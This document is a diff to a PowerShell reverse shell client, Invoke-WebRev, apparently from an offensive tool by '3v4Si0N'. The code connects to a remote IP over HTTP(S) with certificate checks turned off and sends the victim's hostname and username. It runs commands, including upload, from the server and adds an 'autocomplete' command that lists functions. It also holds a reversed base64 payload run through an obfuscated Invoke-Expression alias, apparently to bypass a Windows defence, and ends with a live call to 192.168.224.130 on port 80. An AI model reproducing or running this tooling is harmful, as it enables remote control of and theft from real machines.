@@ -32,7 +32,7 @@ function Invoke-WebRev{
     
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
-    Invoke-Fuckyou;
+    Invoke-FuckYou;
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
     $cuser = toBase64 -str "$env:username";
@@ -44,7 +44,11 @@ function Invoke-WebRev{
     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
     try { $error[0] = ""; } catch {}
+
+    $previous_functions = (ls function:).Name
+    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
 
     while ($true)
     {
@@ -57,7 +61,14 @@ function Invoke-WebRev{
             $result = "";
             $dataToSend = "";
 
-            if($cstr.split(" ")[0] -eq "upload")
+            if($cstr.split(" ")[0] -eq "autocomplete")
+            {
+                $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
+                $functs = toBase64 -str "$functs";
+                $type = '"type":"4UT0C0MPL3T3"';
+                $result = $functs;
+            }
+            elseif($cstr.split(" ")[0] -eq "upload")
             {
                 $type = '"type":"UPL04D"';
                 try
@@ -171,12 +182,36 @@ function getPwd()
 }
 
 
-function Invoke-Fuckyou
+function Invoke-FuckYou
 {
-    $b642 = "==QK2ACLyRGZBRCIsADIsg2Y0BFJokHcvNkO60Fbhh2cyFWTuMXZjlmdyV2Uw9mclRnbJ5SZtlGduVnUu0WZ0NXeTtlCp42bpR3Y1JHdz5WakgCId11WlRXeCtFI9ACajRHUkoQKi0iIoQXasB3Uu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakowOpYDJsIiRGJCKlNWYsBXZS5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiC7kSNkwiIFVkIoU2YhxGclJlLu9Wa0NWdyR3culGJg0DIu9Wa0NWdyR3culGJKsTK0QCLiQERigSZjFGbwVmUu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakowOpMDJsIyQDJCKlNWYsBXZS5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiC7kiMkwiICJkIoU2YhxGclJlLu9Wa0NWdyR3culGJg0DIu9Wa0NWdyR3culGJKsTKxQCLiEUQigSZjFGbwVmUu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakogIGZEew0SRFhHMtQER4BTLDNEew0iQChHMtEUQ4BjIg0DIu9Wa0NWdyR3culGJKsjI4IkIg0DIxQCI7IyNwICI9ACNkAyOicTNiASPgIDJgsjIwgjIg0DI1QCIgsjIwAjIg0DIzQCI7IyMDJCI9AiNkoAbsVnTtQXdPBCfgkCck0lZlJ3WgwCM0gHMgwSNdJzM05Wa1tFIsIHZkFEJoQ3YlR3byBFbhVHdylmV6oTX19WWrNWdGtlCwASPgAHJKkiIyVmZiAyKgIiZ1JkIgsCIi4WYiAyKgIyYTJCIrAiIpNnIgsCIi0WQiACLsxGJoM3clJHZkF0YvJHU0V2R6oTX19WWrNWdGtFI9AickRWQkoQKiwmIgsCIiwmIgsCIiQmIgsCIi4iIgsCIikmIgsCIiMnIgsCIi0mIgsCIiEmIoknchJnYpxEZh9GT6oTX19WWrNWdGtFI9ACbsRiCKU3bZt2Y1ZEJgUGc5RVLkRWQKoAQioQfKowOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQXpIiMzwWZuJXZrJCK0J3bw1WSsxGRbBCIgAiCKsHI19WWrNWdGByczFGbjByYpxmY1BnCKszclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5NFIn5WazVnC70WZ0NXeTByZul2c1pgIABSPgU3bZt2Y1ZEJKoAbsVnbkASPgU3bZt2Y1ZEJ";
-    $b64arr2 = $b642.ToCharArray() ; [array]::Reverse($b64arr2) ; -join $b64arr2 2>&1> $null;
-    $b64str2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$b64arr2"));
-    taleska-ei-vrixeka $b64str2 | Out-Null;
+    $b64 = "=oQK2ACLyRGZBRCIsADIsg2Y0BFJokHcvNkO60Fbhh2cyFWTuMXZjlmdyV2Uw9mclRnbJ5SZtlGduVnUu0WZ0NXeTtlCp42bpR3Y1JHdz5WakgCId11WlRXeCtFI9ACajRHUkowOpYDJgwiIGZkIoU2YhxGclJlLu9Wa0NWdyR3culGJg0DIu9Wa0NWdyR3culGJKsTK1QCIsISRFJCKlNWYsBXZS5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiC7kCNkACLiQERigSZjFGbwVmUu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakowOpMDJgwiIDNkIoU2YhxGclJlLu9Wa0NWdyR3culGJg0DIu9Wa0NWdyR3culGJKsTKyQCIsIiQCJCKlNWYsBXZS5ibvlGdjVnc0NnbpRCI9AibvlGdjVnc0NnbpRiC7kSMkACLiEUQigSZjFGbwVmUu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakoQKiMiIoQXasB3Uu42bpR3Y1JHdz5WakASPg42bpR3Y1JHdz5WakoAI7ICM4ICI9ASNkAyOiADMiASPgMDJgsjIzMkIg0DI2QCI7IyNwICI9ACNkAyOigjQiASPgEDJgsjI3UjIg0DIyQiCiYkR4BzIFVEewMCREhHMjM0Q4BzICJEewMSQBhHMiASPg42bpR3Y1JHdz5WakoAbsVnTtQXdPBCfgkCck0lZlJ3WgwCM0gHMgwSNdJzM05Wa1tFIsIHZkFEJoQ3YlR3byBFbhVHdylmV6oTX19WWrNWdGtlCwASPgAHJKkiIyVmZiAyKgIiZ1JkIgsCIi4WYiAyKgIyYTJCIrAiIpNnIgsCIi0WQiACLsxGJoM3clJHZkF0YvJHU0V2R6oTX19WWrNWdGtFI9AickRWQkoQKiwmIgsCIiwmIgsCIiQmIgsCIi4iIgsCIikmIgsCIiMnIgsCIi0mIgsCIiEmIoknchJnYpxEZh9GT6oTX19WWrNWdGtFI9ACbsRiCKU3bZt2Y1ZEJgUGc5RVLkRWQKoAQioQfKowOpQ3YlR3byBFZs9EbmBHbgQnbpVHI0V3bgwCdjVGdvJHU3VmTsZGI05Wa1BCLlpXaTdHZgIHdQRnbJVFIsM3clJHZkFEcsBic0BFdulEK0NWZ09mcQxWY1RncpZFIs92biBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh5GIn5WayR3coknchJnYpxEZh9GTgIHdQRnbJBibyVGd4VGIjlGdhR3cgMWasJWdwBCIgAiCdliIyMDbl5mcltmIoQncvBXbJxGbEtFIgACIKowOpUWbh50YvJHcgcmbpJHdzBCLlxWdk9WToBic0BFdulEKzNXZyRGZBN2byBFdldEIyRHU05WSg4mclRHelByYpRXY0NHIjlGbiVHcgACIgoQXpIiMzwWZuJXZrJCK0J3bw1WSsxGRbBCIgAiCKsHI19WWrNWdGByczFGbjByYpxmY1BnCKszclNWa2JXZTB3byVGdulkLl1Wa05WdS5SblR3c5NFIn5WazVnC70WZ0NXeTByZul2c1pgIABSPgU3bZt2Y1ZEJKoAbsVnbkASPgU3bZt2Y1ZEJ";
+    $b64arr = $b64.ToCharArray() ; [array]::Reverse($b64arr) ; -join $b64arr 2>&1> $null;
+    $b64str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$b64arr"));
+    taleska-ei-vrixeka $b64str | Out-Null;
 }
 
-#Invoke-WebRev -ip 192.168.230.128 -port 80
+function Get-ImportedFunctions
+{
+    $menu = @"
+
+         By: 3v4Si0N
+"@
+
+    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
+        $current_functions = (ls function:).Name
+        [array]$preloaded_functions = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
+        $current_functions = $current_functions + $preloaded_functions
+        $new_functions = (Compare-Object -ReferenceObject $previous_functions -DifferenceObject $current_functions).InputObject
+        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
+        $menu = $menu + $output + "`n";
+    } else {
+        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
+        $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
+        $show_functions = $show_functions -replace "  ","" 
+        $menu = $menu + $show_functions + "`n"
+        $menu = $menu -replace " [+]","[+]"
+    }
+    return $menu;
+}
+
+Invoke-WebRev -ip 192.168.224.130 -port 80
